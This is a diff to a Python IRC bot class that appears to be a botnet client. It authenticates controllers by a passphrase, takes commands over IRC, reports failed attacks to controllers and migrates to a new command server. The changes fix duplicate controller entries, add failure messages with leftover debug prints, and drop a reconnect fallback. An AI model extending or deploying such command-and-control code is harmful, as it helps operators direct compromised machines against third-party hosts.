@@ -66,7 +66,8 @@ class Bot:
     # Gets response 
     def handleResponse(self, prefix, message):
         if message == self.PHRASE:
-            self.acceptedCons.append(prefix)
+            if prefix not in self.acceptedCons:
+                self.acceptedCons.append(prefix)
         if prefix in self.acceptedCons:
             print("from " + prefix + " to do " + message)
             if message == "status":
@@ -122,6 +123,10 @@ class Bot:
             for x in self.acceptedCons:
                 self.privateMsg(x, msg)
         except Exception as e:
+            reason = "Unknown reason"
+            for x in self.acceptedCons:
+                print("IM SENDING")
+                self.privateMsg(x, "Attack failed - name - idk")
             if isinstance(e, socket.gaierror):
                 reason = "no such hostname"
             msg = ("Attack failed - " + self.botNick + " - " + str(reason))
@@ -140,12 +145,7 @@ class Bot:
         try:
             newSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             newPort = int(newPort)
-
-            # Have this here bc had issues trying to connect to same server
-            try:
-                newSocket.connect((newHost, newPort))
-            except:
-                newSocket = self.IRCSOCKET
+            newSocket.connect((newHost, newPort))
 
             # At this point, if it doesn't throw an exception, it should be good 
             # Now connect bot to channel
@@ -159,7 +159,6 @@ class Bot:
             self.PORT = newPort 
             self.CHANNEL = newChannel 
             # Disconnect from old Channel
-            print("zzzzzzzzzzzzzasdfasdfdsasfdbdsv")
             try:
                 self.IRCSOCKET.close()
                 self.IRCSOCKET = newSocket 
